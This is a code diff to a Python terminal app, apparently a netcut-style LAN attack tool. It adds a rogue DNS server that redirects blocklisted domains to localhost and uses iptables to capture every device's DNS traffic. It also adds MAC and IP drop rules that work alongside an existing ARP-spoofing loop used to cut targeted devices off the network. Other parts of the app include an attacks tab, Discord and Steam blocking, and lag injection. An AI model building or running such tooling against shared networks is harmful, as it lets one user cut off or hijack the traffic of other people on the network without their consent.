@@ -52,9 +52,54 @@ sniff_thread = None
 DISCORD_RANGES = ["162.159.0.0/16", "173.245.48.0/20", "108.162.0.0/15", "104.16.0.0/12", "131.0.72.0/22"]
 STEAM_RANGES = ["208.64.200.0/22", "208.78.164.0/22", "185.25.182.0/23"]
 custom_blocks = {}
+global_dns_block = False
+dns_server_thread = None
+dns_blocklist = set()
 _attacks_built = False
 CDN_MAP = {"googlevideo.com":"youtube.com","ytimg.com":"youtube.com","ggpht.com":"youtube.com","phncdn.com":"pornhub.com","rncdn7.com":"pornhub.com","rncdn3.com":"pornhub.com","rncdn1.com":"pornhub.com","gstatic.com":"google.com","googleusercontent.com":"google.com"}
 OUI_DB = {"b0:a7:b9":"TP-Link","c8:5a:cf":"HP Inc.","f0:f6:c1":"Sonos Inc.","c4:77:af":"ADB","d8:1f:12":"Tuya Smart","70:08:10":"Intel","54:44:a3":"Samsung","10:ae:60":"Amazon","a0:02:dc":"Amazon","7c:1e:52":"Amazon","e8:eb:11":"Asus","00:1a:11":"Google","00:1b:63":"Apple","00:25:00":"Apple","00:26:08":"Apple","00:26:b0":"Apple","00:50:56":"VMware","14:cc:20":"TP-Link","50:c7:6b":"TP-Link","b8:27:eb":"Raspberry Pi","dc:a6:32":"Xiaomi"}
+
+def _dns_server_run():
+    import socket, struct
+    DNS_UPSTREAM = ("1.1.1.1", 53)
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    sock.bind(("0.0.0.0", 53))
+    sock.settimeout(1)
+    while not quit_flag:
+        try:
+            data, addr = sock.recvfrom(512)
+            if len(data) < 12: continue
+            qname_parts = []
+            i = 12
+            while data[i] != 0:
+                length = data[i]
+                qname_parts.append(data[i+1:i+1+length].decode(errors='ignore'))
+                i += 1 + length
+            qname = ".".join(qname_parts).lower()
+            blocked = any(d in qname for d in dns_blocklist)
+            if blocked:
+                tid = struct.pack(">H", (data[0] << 8) | data[1])
+                flags = struct.pack(">H", 0x8183)
+                qdcount = struct.pack(">H", 1)
+                ancount = struct.pack(">H", 1)
+                nscount = struct.pack(">H", 0)
+                arcount = struct.pack(">H", 0)
+                rdata = struct.pack(">I", 0x7f000001)
+                resp = tid + flags + qdcount + ancount + nscount + arcount + data[12:i+1] + struct.pack(">H",1)+struct.pack(">H",1)+struct.pack(">I",60)+struct.pack(">H",4)+rdata
+                sock.sendto(resp, addr)
+            else:
+                fwd = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                fwd.settimeout(3)
+                fwd.sendto(data, DNS_UPSTREAM)
+                try:
+                    rdata, _ = fwd.recvfrom(512)
+                    sock.sendto(rdata, addr)
+                except: pass
+                fwd.close()
+        except socket.timeout: continue
+        except: continue
+    sock.close()
 
 def vendor(mac): return OUI_DB.get(mac[:8].lower(), "Unknown")
 
@@ -357,6 +402,8 @@ class NetcutApp(App):
         elif btn_id == "unblock-domain-btn":
             domain = self.query_one("#domain-input", Input).value.strip()
             if domain: self.unblock_domain(domain)
+        elif btn_id == "global-dns-btn":
+            self.toggle_global_dns()
         elif btn_id == "block-ip-btn":
             ip = self.query_one("#target-ip",Input).value.strip()
             mac = next((d["mac"] for d in devices if d["ip"]==ip), None)
@@ -464,14 +511,19 @@ class NetcutApp(App):
         t = threading.Thread(target=arp_spoof_loop, args=(ip,mac,gateway_ip,ev), daemon=True)
         t.start()
         spoof_threads[ip] = (t, ev)
-        self.notify(f"Blocked {ip}", severity="warning", timeout=2)
+        os.system(f"iptables -I FORWARD 1 -m mac --mac-source {mac} -j DROP 2>/dev/null")
+        os.system(f"iptables -I FORWARD 1 -d {ip} -j DROP 2>/dev/null")
+        self.notify(f"Blocked {ip} ({mac})", severity="warning", timeout=2)
     
     def unblock_device(self, ip):
+        mac = next((d["mac"] for d in devices if d["ip"] == ip), None)
         if ip in spoof_threads:
             _, ev = spoof_threads[ip]; ev.clear(); del spoof_threads[ip]
         blocked_ips.discard(ip)
         try: scapy.send(scapy.ARP(op=2,pdst=ip,psrc=gateway_ip), verbose=False)
         except: pass
+        os.system(f"iptables -D FORWARD -d {ip} -j DROP 2>/dev/null")
+        if mac: os.system(f"iptables -D FORWARD -m mac --mac-source {mac} -j DROP 2>/dev/null")
         self.notify(f"Unblocked {ip}", severity="information", timeout=2)
     
     def unblock_all(self):
@@ -563,6 +615,30 @@ class NetcutApp(App):
         self.update_stats()
         self.build_attacks_tab()
     
+    def toggle_global_dns(self):
+        global global_dns_block, dns_server_thread, dns_blocklist
+        if global_dns_block:
+            global_dns_block = False
+            if dns_server_thread and dns_server_thread.is_alive():
+                dns_server_thread = None
+            os.system("iptables -t nat -D PREROUTING -p udp --dport 53 -j REDIRECT --to-port 53 2>/dev/null")
+            os.system("iptables -D INPUT -p udp --dport 53 -j ACCEPT 2>/dev/null")
+            self.notify("Global DNS block disabled", timeout=2)
+        else:
+            try:
+                import socket, struct, threading
+                dns_blocklist = set(custom_blocks.keys())
+                dns_server_thread = threading.Thread(target=_dns_server_run, daemon=True)
+                dns_server_thread.start()
+                os.system("iptables -I INPUT 1 -p udp --dport 53 -j ACCEPT 2>/dev/null")
+                os.system("iptables -t nat -I PREROUTING 1 -p udp --dport 53 -j REDIRECT --to-port 53 2>/dev/null")
+                global_dns_block = True
+                self.notify("Global DNS block ON — all devices blocked", severity="warning", timeout=5)
+            except Exception as e:
+                self.notify(f"Global DNS failed: {e}", severity="error", timeout=5)
+        self.update_stats()
+        self.build_attacks_tab()
+    
     def clear_attacks(self):
         global quick_discord, quick_steam, quick_latency_ip, quick_tc_qdisc
         if quick_discord: self.toggle_discord()
@@ -610,6 +686,9 @@ class NetcutApp(App):
                 id="domain-btn-row"
             ))
             pane.mount(Static("", id="domain-status"))
+            pane.mount(Static("[bold]Global DNS Block[/]"))
+            pane.mount(Horizontal(Button("Toggle Global DNS Block", id="global-dns-btn", variant="warning"), id="global-dns-row"))
+            pane.mount(Static("", id="global-dns-status"))
         except Exception as e:
             self.notify(f"Build: {e}", severity="error", timeout=10)
     
@@ -623,6 +702,8 @@ class NetcutApp(App):
             self.query_one("#lag-btn", Button).variant = "warning" if quick_tc_qdisc else "primary"
             status = f"[dim]Blocked: {', '.join(custom_blocks.keys())}[/]" if custom_blocks else ""
             self.query_one("#domain-status", Static).update(status)
+            gs = "[green]ACTIVE[/]" if global_dns_block else "[dim]OFF[/]"
+            self.query_one("#global-dns-status", Static).update(f"Global DNS Block: {gs}")
         except: pass
     
     def build_monitor_tab(self):
@@ -703,6 +784,9 @@ class NetcutApp(App):
             for ip in custom_blocks[domain]:
                 os.system(f"iptables -D FORWARD -d {ip} -j DROP 2>/dev/null")
                 os.system(f"iptables -D OUTPUT -d {ip} -j DROP 2>/dev/null")
+        if global_dns_block:
+            os.system("iptables -t nat -D PREROUTING -p udp --dport 53 -j REDIRECT --to-port 53 2>/dev/null")
+            os.system("iptables -D INPUT -p udp --dport 53 -j ACCEPT 2>/dev/null")
         self.exit()
 
 if __name__ == "__main__":
